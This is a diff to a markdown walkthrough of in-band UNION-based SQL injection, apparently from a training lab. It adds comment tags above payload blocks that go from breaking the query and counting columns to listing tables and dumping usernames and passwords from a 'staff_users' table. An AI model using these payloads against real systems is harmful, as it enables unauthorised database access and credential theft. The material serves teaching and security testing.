@@ -20,6 +20,7 @@ In-band SQL injection returns extracted data in the same HTTP response used to s
 
 ### 1. Break the query
 
+<!-- cmd: sql -->
 ```sql
 id=1'
 id=1"
@@ -29,6 +30,7 @@ A syntax error confirms that input is affecting the SQL parser.
 
 ### 2. Find the column count
 
+<!-- cmd: sql -->
 ```sql
 1 UNION SELECT 1
 1 UNION SELECT 1,2
@@ -39,6 +41,7 @@ The first payload that returns without error gives the usable column count.
 
 ### 3. Suppress the original row
 
+<!-- cmd: sql -->
 ```sql
 0 UNION SELECT 1,2,3
 ```
@@ -47,12 +50,14 @@ Using an impossible ID makes the injected row easier to see.
 
 ### 4. Identify the current database
 
+<!-- cmd: sql -->
 ```sql
 0 UNION SELECT 1,2,database()
 ```
 
 ### 5. List tables
 
+<!-- cmd: sql -->
 ```sql
 0 UNION SELECT 1,2,group_concat(table_name)
 FROM information_schema.tables
@@ -61,6 +66,7 @@ WHERE table_schema = 'sqli_one'
 
 ### 6. List columns
 
+<!-- cmd: sql -->
 ```sql
 0 UNION SELECT 1,2,group_concat(column_name)
 FROM information_schema.columns
@@ -69,6 +75,7 @@ WHERE table_name = 'staff_users'
 
 ### 7. Extract rows
 
+<!-- cmd: sql -->
 ```sql
 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>')
 FROM staff_users
